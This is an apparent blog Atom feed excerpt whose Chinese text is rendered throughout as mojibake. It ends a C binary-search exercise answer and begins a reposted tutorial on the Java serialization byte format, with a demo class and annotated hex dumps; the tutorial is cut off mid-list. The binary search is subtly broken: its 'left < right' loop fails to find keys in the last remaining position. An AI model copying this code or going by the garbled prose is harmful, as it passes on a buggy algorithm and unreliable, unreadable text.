<span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  SSTable T;  KeyType k;</span><br><span class="line">   Create(T);</span><br><span class="line">   <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">   <span class="keyword">int</span> pos=Search_Bin(T,k);</span><br><span class="line">   <span class="keyword">if</span>(pos==<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"NOT FOUND"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;pos&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¯·åœ¨è¿™é‡Œå¡«å†™ç­”æ¡ˆ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰åºè¡¨çš„å…ƒç´ ä¸ªæ•°</span><br><span class="line">æ¥ä¸‹æ¥ä¸€è¡Œnä¸ªæ•°å­—ï¼Œä¾æ¬¡ä¸ºè¡¨å†…å…ƒç´ å€¼ã€‚</span><br><span class="line">ç„¶åè¾“å…¥ä¸€ä¸ªè¦æŸ¥æ‰¾çš„å€¼ã€‚</span><br><span class="line">5</span><br><span class="line">1 3 5 7 9</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">è¾“å‡ºè¿™ä¸ªå€¼åœ¨è¡¨å†…çš„ä½ç½®</span><br><span class="line">å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œè¾“å‡º&quot;NOT FOUND&quot;ã€‚</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-11"><a href="#è§£ç­”-11" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">1</span>; <span class="comment">//å·¦è¾¹èµ·å§‹ç‚¹</span></span><br><span class="line">    <span class="keyword">int</span> right = T.length; <span class="comment">// é“¾è¡¨æœ€åä¸€ä½</span></span><br><span class="line">    <span class="keyword">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key == k) &#123; <span class="comment">// æ‰¾åˆ°k, kä¸ºT.R[mid].key</span></span><br><span class="line">            <span class="keyword">return</span> mid;  <span class="comment">// è¿”å›midå³kçš„ä½ç½®</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key &gt; k) &#123; <span class="comment">// kåœ¨ä¸­é—´åå·¦</span></span><br><span class="line">            right = mid<span class="number">-1</span>; <span class="comment">// ä½¿å³è¾¹ç•Œæ”¶ç¼©åˆ° ä¸­é—´å·¦ä¸€</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// kåœ¨ä¸­é—´åå³</span></span><br><span class="line">            left = mid+<span class="number">1</span>; <span class="comment">// ä½¿å·¦è¾¹ç•Œæ”¶ç¼©åˆ° ä¸­é—´å³ä¸€</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//é‡å¤ä»¥ä¸Šæ“ä½œï¼Œç›´è‡³å·¦å³è¾¹ç•Œç›¸é‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç®—æ³•åŸç†è¦èŠ±æ—¶é—´å¥½å¥½æ‘¸ä¸€ä¸‹ï¼Œæ¨èä¸€ä¸ªå¤§ä½¬çš„æ•°æ®ç»“æ„ç®—æ³•è¯¦è§£&lt;br&gt;&lt;a href=&quot;https://github.com/labuladong/fucking-algorithm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æ‰‹æŠŠæ‰‹æ’•LeetCodeé¢˜ç›®ï¼Œæ‰’å„ç§ç®—æ³•å¥—è·¯çš„è£¤å­&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="LeetCode" scheme="https://manayakko.github.io/yakko117/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ– [è½¬è½½]</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/28/about-java-serialization-and-deserialization/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/28/about-java-serialization-and-deserialization/</id>
    <published>2020-02-28T11:40:56.258Z</published>
    <updated>2020-03-03T04:05:47.185Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>github ä¸Šçœ‹åˆ°çš„ï¼Œè¾¹çœ‹è¾¹å­¦ï¼Œè¾¹è®°ç¬”è®°<br><a href="https://github.com/gyyyy" target="_blank" rel="noopener">æ„Ÿè°¢å®«éŸ³å¸ˆå‚…çš„æ–‡ç« </a></p><a id="more"></a><h1 id="æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h1><p>åˆ«è¯´ä½ æ‡‚ååºåˆ—åŒ–ï¼Œä¹Ÿåˆ«å†è¯´ä½ ä¸æ‡‚ååºåˆ—åŒ–ã€‚</p><h1 id="åºåˆ—åŒ–æœºåˆ¶"><a href="#åºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="åºåˆ—åŒ–æœºåˆ¶"></a>åºåˆ—åŒ–æœºåˆ¶</h1><p>åºåˆ—åŒ– <code>Serialization</code> æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå­—èŠ‚æµï¼Œä¾‹å¦‚ <code>å­˜å‚¨æˆæ–‡ä»¶ã€å†…å­˜ç¼“å†²ï¼Œæˆ–ç»ç”±ç½‘ç»œä¼ è¾“</code> ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½å¤Ÿæ¢å¤å¯¹è±¡åŸæ¥çŠ¶æ€çš„è¿‡ç¨‹ã€‚åºåˆ—åŒ–æœºåˆ¶åœ¨Javaä¸­æœ‰ç€å¹¿æ³›çš„åº”ç”¨ï¼Œ<code>EJBã€RMIã€Hessian</code> ç­‰æŠ€æœ¯éƒ½ä»¥æ­¤ä¸ºåŸºç¡€ã€‚</p><hr><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>æˆ‘ä»¬å…ˆç”¨ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–ç¤ºä¾‹æ¥çœ‹çœ‹Javaç©¶ç«Ÿæ˜¯å¦‚ä½•å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–çš„ï¼š</p><h2 id="ç®€å•åºåˆ—åŒ–ç¤ºä¾‹"><a href="#ç®€å•åºåˆ—åŒ–ç¤ºä¾‹" class="headerlink" title="ç®€å•åºåˆ—åŒ–ç¤ºä¾‹"></a>ç®€å•åºåˆ—åŒ–ç¤ºä¾‹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bout);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> SerializationDemo(<span class="string">"gyyyy"</span>, <span class="number">97777</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¦‚æœç†Ÿæ‚‰PHPçš„åŒå­¦åº”è¯¥çŸ¥é“ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨ç»è¿‡PHPåºåˆ—åŒ–åå¾—åˆ°çš„å­—ç¬¦ä¸²å¦‚ä¸‹ <font color="#0099ff">å› ä¸ºPHPä¸Javaçš„ç¼–ç¨‹ä¹ æƒ¯æœ‰æ‰€åŒºåˆ«</font>ï¼Œè¿™é‡Œå­—æ®µè®¿é—®æƒé™å…¨æ”¹ä¸ºäº†<code>public</code>ï¼Œ<code>private</code>å’Œ<code>protected</code>ä»è¡¨ç°å½¢å¼ä¸Šæ¥è¯´å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº†äº›ç‰¹æ®Šçš„æ ‡è¯†è€Œå·²ï¼Œä¸ºäº†å‡å°‘ä¸€äº›é›¶åŸºç¡€çš„åŒå­¦ä¸å¿…è¦çš„ç–‘æƒ‘ï¼Œè¿™é‡Œæš‚ä¸è®¨è®ºï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:17:&quot;SerializationDemo&quot;:2:&#123;s:11:&quot;stringField&quot;;s:5:&quot;gyyyy&quot;;s:8:&quot;intField&quot;;i:97777;&#125;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ï¼Œ<code>O:17:&quot;...&quot;</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ª <code>(Object)å¯¹è±¡</code>ï¼Œä»¥åŠè¯¥å¯¹è±¡ç±»åçš„å­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ï¼Œ<code>2:{...}</code> è¡¨ç¤ºè¯¥ç±»æœ‰2ä¸ªå­—æ®µ ï¼ˆå…ƒç´ é—´ç”¨ <code>;</code> åˆ†éš”ï¼Œé”®å€¼å¯¹ä¹Ÿåˆ†ä¸ºå‰åä¸¤ä¸ªå…ƒç´ è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ˜¯2ä¸ªå­—æ®µï¼Œåˆ™æ€»å…±ä¼šåŒ…å«4ä¸ªå…ƒç´ ï¼‰ï¼Œ<code>s:11:&quot;...&quot;</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º11çš„å­—ç¬¦ä¸²ï¼Œ<code>i:...</code> è¡¨ç¤ºå½“å‰æ˜¯ä¸€ä¸ª <code>æ•´æ•°(integer)</code>ã€‚</p><p>ç”±æ­¤å¯çŸ¥ï¼ŒPHPåºåˆ—åŒ–å­—ç¬¦ä¸²åŸºæœ¬ä¸Šæ˜¯å¯äººè¯»çš„ï¼Œè€Œä¸”å¯¹äºç±»å¯¹è±¡æ¥è¯´ï¼Œå­—æ®µç­‰æˆå‘˜å±æ€§çš„åºåˆ—åŒ–é¡ºåºä¸å®šä¹‰é¡ºåºä¸€è‡´ã€‚æˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‰‹å·¥çš„æ–¹å¼æ¥æ„é€ ä»»æ„ä¸€ä¸ªPHPå¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p><hr><h3 id="Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²"><a href="#Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²" class="headerlink" title="Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²"></a>Javaåºåˆ—åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²</h3><p><font color="#0099ff">è€Œè¯¥å¯¹è±¡ç»è¿‡Javaåºåˆ—åŒ–åå¾—åˆ°çš„åˆ™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ä¸²ï¼š</font></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f d9 35 3c f7 d6 0a c6    ationDem o.5&lt;....</span><br><span class="line">d5 02 00 02 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 0b 73 74 72 69 6e 67  46 69 65 6c 64 74 00 12    ..string Fieldt..</span><br><span class="line">4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e    Ljava&#x2F;la ng&#x2F;Strin</span><br><span class="line">67 3b 78 70 00 01 7d f1  74 00 05 67 79 79 79 79    g;xp..&#125;. t..gyyyy</span><br></pre></td></tr></table></figure></div><p>ä»”ç»†è§‚å¯ŸäºŒè¿›åˆ¶ä¸²ä¸­çš„éƒ¨åˆ†å¯è¯»æ•°æ®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å·®ä¸å¤šåˆ†è¾¨å‡ºè¯¥å¯¹è±¡çš„ä¸€äº›åŸºæœ¬å†…å®¹ã€‚ä½†åŒæ ·ä¸ºäº†æ‰‹å†™çš„ç›®çš„ <em>ï¼ˆä¸ºä»€ä¹ˆæœ‰è¿™ä¸ªç›®çš„ï¼ŸåŸå› å¾ˆç®€å•ï¼Œä¸ºäº†ä¸è¢«è¯­è¨€ç¯å¢ƒæŸç¼šï¼‰</em> ï¼Œä»¥åŠä¸ºæ¥ä¸‹æ¥çš„åºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æåšå‡†å¤‡ï¼Œæˆ‘ä»¬å…ˆä¾æ¬¡æ¥è§£è¯»ä¸€ä¸‹è¿™ä¸ªäºŒè¿›åˆ¶ä¸²ä¸­çš„å„ä¸ªå…ƒç´ ã€‚</p><ul><li><code>0xaced</code>ï¼Œé­”æœ¯å¤´</li><li><code>0x0005</code>ï¼Œç‰ˆæœ¬å· ï¼ˆJDKä¸»æµç‰ˆæœ¬ä¸€è‡´ï¼Œä¸‹æ–‡å¦‚æ— ç‰¹æ®Šæ ‡æ³¨ï¼Œéƒ½ä»¥<font color="red">JDK8u</font>ä¸ºä¾‹ï¼‰</li><li><code>0x73</code>ï¼Œå¯¹è±¡ç±»å‹æ ‡è¯† <em>ï¼ˆ<code>0x7n</code>åŸºæœ¬ä¸Šéƒ½å®šä¹‰äº†ç±»å‹æ ‡è¯†ç¬¦å¸¸é‡ï¼Œä½†ä¹Ÿè¦çœ‹å‡ºç°çš„ä½ç½®ï¼Œæ¯•ç«Ÿå®ƒä»¬éƒ½åœ¨å¯è§å­—ç¬¦çš„èŒƒå›´ï¼Œè¯¦è§<code>java.io.ObjectStreamConstants</code>ï¼‰</em></li><li><code>0x72</code>ï¼Œç±»æè¿°ç¬¦æ ‡è¯†</li><li><code>0x0011...</code>ï¼Œç±»åå­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ <em>ï¼ˆJavaåºåˆ—åŒ–ä¸­çš„UTF8æ ¼å¼æ ‡å‡†ï¼‰</em></li><li><code>0xd9353cf7d60ac6d5</code>ï¼Œåºåˆ—ç‰ˆæœ¬å”¯ä¸€æ ‡è¯† <em>ï¼ˆ<code>serialVersionUID</code>ï¼Œç®€ç§°SUIDï¼‰</em></li><li><code>0x02</code>ï¼Œå¯¹è±¡çš„åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½ï¼Œå¦‚æ˜¯å¦æ˜¯Block Dataæ¨¡å¼ã€è‡ªå®šä¹‰<code>writeObject()</code>ï¼Œ<code>Serializable</code>ã€<code>Externalizable</code>æˆ–<code>Enum</code>ç±»å‹ç­‰</li><li><code>0x0002</code>ï¼Œç±»çš„å­—æ®µä¸ªæ•°</li><li><code>0x49</code>ï¼Œæ•´æ•°ç±»å‹ç­¾åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ŒåŒç†ï¼Œä¹‹åçš„<code>0x4c</code>ä¸ºå­—ç¬¦ä¸²ç±»å‹ç­¾åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ <font color="#0099ff">ï¼ˆç±»å‹ç­¾åè¡¨ç¤ºä¸JVMè§„èŒƒä¸­çš„å®šä¹‰ç›¸åŒï¼‰</font></li><li><code>0x0008...</code>ï¼Œå­—æ®µåå­—ç¬¦ä¸²é•¿åº¦å’Œå€¼ï¼ŒéåŸå§‹æ•°æ®ç±»å‹çš„å­—æ®µè¿˜ä¼šåœ¨åé¢åŠ ä¸Šæ•°æ®ç±»å‹æ ‡è¯†ã€å®Œæ•´ç±»å‹ç­¾åé•¿åº¦å’Œå€¼ï¼Œå¦‚ä¹‹åçš„<code>0x740012...</code></li><li><code>0x78</code> Block Dataç»“æŸæ ‡è¯†</li><li><code>0x70</code> çˆ¶ç±»æè¿°ç¬¦æ ‡è¯†ï¼Œæ­¤å¤„ä¸º<code>null</code></li><li><code>0x00017df1</code> æ•´æ•°å­—æ®µ<code>intField</code>çš„å€¼ <em>ï¼ˆJavaåºåˆ—åŒ–ä¸­çš„æ•´æ•°æ ¼å¼æ ‡å‡†ï¼‰</em> ï¼ŒéåŸå§‹æ•°æ®ç±»å‹çš„å­—æ®µåˆ™ä¼šæŒ‰å¯¹è±¡çš„æ–¹å¼å¤„ç†ï¼Œå¦‚ä¹‹åçš„å­—ç¬¦ä¸²å­—æ®µ<code>stringField</code>è¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œè¾“å‡ºå­—ç¬¦ä¸²ç±»å‹æ ‡è¯†ã€å­—ç¬¦ä¸²é•¿åº¦å’Œå€¼</li></ul><p>ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œé™¤äº†åŸºæœ¬æ ¼å¼å’Œä¸€äº›æ•´æ•°è¡¨ç°å½¢å¼ä¸Šçš„ä¸åŒä¹‹å¤–ï¼ŒJavaå’ŒPHPçš„åºåˆ—åŒ–ç»“æœè¿˜æ˜¯å­˜åœ¨å¾ˆå¤šç›¸ä¼¼çš„åœ°æ–¹ï¼Œæ¯”å¦‚é™¤äº†å…·ä½“å€¼å¤–éƒ½ä¼šå¯¹ç±»å‹è¿›è¡Œæè¿°ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJavaåºåˆ—åŒ–ä¸­å¯¹å­—æ®µè¿›è¡Œå°è£…æ—¶ï¼Œä¼šæŒ‰åŸå§‹å’ŒéåŸå§‹æ•°æ®ç±»å‹æ’åº <em>ï¼ˆæœ‰åŒå­¦å¯èƒ½æƒ³é—®ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œè¿™é‡Œæˆ‘åªèƒ½ç®€å•è§£é‡ŠåŸå› æœ‰ä¸¤ä¸ªï¼Œä¸€æ˜¯å› ä¸ºå®ƒä»¬ä¸¤ä¸ªçš„è¡¨ç°å½¢å¼ä¸åŒï¼ŒåŸå§‹æ•°æ®ç±»å‹å­—æ®µå¯ä»¥ç›´æ¥é€šè¿‡åç§»é‡è¯»å–å›ºå®šä¸ªæ•°çš„å­—èŠ‚æ¥èµ‹å€¼ï¼›äºŒæ˜¯åœ¨å°è£…æ—¶ä¼šè®¡ç®—åŸå§‹ç±»å‹å­—æ®µçš„åç§»é‡å’Œæ€»åç§»é‡ï¼Œä»¥åŠéåŸå§‹ç±»å‹å­—æ®µçš„ä¸ªæ•°ï¼Œè¿™ä½¿å¾—ååºåˆ—åŒ–é˜¶æ®µå¯ä»¥å¾ˆæ–¹ä¾¿çš„æŠŠåŸå§‹å’ŒéåŸå§‹æ•°æ®ç±»å‹åˆ†æˆä¸¤éƒ¨åˆ†æ¥å¤„ç†ï¼‰</em> ï¼Œä¸”å…¶ä¸­åˆä¼šæŒ‰å­—æ®µåæ’åºã€‚</p><p>è€Œå¼€å¤´å›ºå®šçš„<code>0xaced0005</code>ä¹Ÿå¯ä»¥ä½œä¸ºJavaåºåˆ—åŒ–äºŒè¿›åˆ¶ä¸² <em>ï¼ˆBase64ç¼–ç ä¸º<code>rO0AB...</code>ï¼‰</em> çš„è¯†åˆ«æ ‡è¯†ã€‚</p><hr><h3 id="è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š"><a href="#è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š" class="headerlink" title="è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š"></a>è®©æˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡å†æ”¹å¤æ‚äº›ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String superField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationComponentClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String componentField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">extends</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SerializationComponentClass component;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®ƒåºåˆ—åŒ–åçš„äºŒè¿›åˆ¶ä¸²å¤§å®¶å¯ä»¥è‡ªè¡Œæ¶ˆåŒ–ç†è§£ä¸€ä¸‹ï¼Œæ³¨æ„å…¶ä¸­çš„åµŒå¥—å¯¹è±¡ï¼Œä»¥åŠ<code>0x71</code>è¡¨ç¤ºçš„<code>Reference</code>ç±»å‹æ ‡è¯† <em>ï¼ˆå½¢å¼ä¸Šä¸JVMçš„å¸¸é‡æ± ç±»ä¼¼ï¼Œç”¨äºéåŸå§‹æ•°æ®ç±»å‹çš„å¼•ç”¨å¯¹è±¡æ± ç´¢å¼•ï¼Œè¿™ä¸ªå¼•ç”¨å¯¹è±¡æ± åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–åˆ›å»ºæ—¶çš„å…ƒç´ å¡«å……é¡ºåºä¼šä¿æŒä¸€è‡´ï¼‰</em> ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f 1a 7f cd d3 53 6f 6b    ationDem o....Sok</span><br><span class="line">15 02 00 03 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 09 63 6f 6d 70 6f 6e  65 6e 74 74 00 1d 4c 53    ..compon entt..LS</span><br><span class="line">65 72 69 61 6c 69 7a 61  74 69 6f 6e 43 6f 6d 70    erializa tionComp</span><br><span class="line">6f 6e 65 6e 74 43 6c 61  73 73 3b 4c 00 0b 73 74    onentCla ss;L..st</span><br><span class="line">72 69 6e 67 46 69 65 6c  64 74 00 12 4c 6a 61 76    ringFiel dt..Ljav</span><br><span class="line">61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 72    a&#x2F;lang&#x2F;S tring;xr</span><br><span class="line">00 17 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 53    ..Serial izationS</span><br><span class="line">75 70 65 72 43 6c 61 73  73 de c6 50 b7 d1 2f a3    uperClas s..P..&#x2F;.</span><br><span class="line">27 02 00 01 4c 00 0a 73  75 70 65 72 46 69 65 6c    &#39;...L..s uperFiel</span><br><span class="line">64 71 00 7e 00 02 78 70  70 00 01 7d f1 73 72 00    dq.~..xp p..&#125;.sr.</span><br><span class="line">1b 53 65 72 69 61 6c 69  7a 61 74 69 6f 6e 43 6f    .Seriali zationCo</span><br><span class="line">6d 70 6f 6e 65 6e 74 43  6c 61 73 73 3c 76 ba b7    mponentC lass&lt;v..</span><br><span class="line">dd 9e 76 c4 02 00 01 4c  00 0e 63 6f 6d 70 6f 6e    ..v....L ..compon</span><br><span class="line">65 6e 74 46 69 65 6c 64  71 00 7e 00 02 78 70 70    entField q.~..xpp</span><br><span class="line">74 00 05 67 79 79 79 79                             t..gyyyy</span><br></pre></td></tr></table></figure></div><p>ç®€å•çš„åˆ†æä¸€ä¸‹åºåˆ—åŒ–çš„æ‰§è¡Œæµç¨‹ï¼š</p><ol><li><code>ObjectOutputStream</code>å®ä¾‹åˆå§‹åŒ–æ—¶ï¼Œå°†é­”æœ¯å¤´å’Œç‰ˆæœ¬å·å†™å…¥<code>bout</code> <em>ï¼ˆ<code>BlockDataOutputStream</code>ç±»å‹ï¼‰</em> ä¸­</li><li>è°ƒç”¨<code>ObjectOutputStream.writeObject()</code>å¼€å§‹å†™å¯¹è±¡æ•°æ®<ul><li><code>ObjectStreamClass.lookup()</code>å°è£…å¾…åºåˆ—åŒ–çš„ç±»æè¿° <em>ï¼ˆè¿”å›<code>ObjectStreamClass</code>ç±»å‹ï¼‰</em> 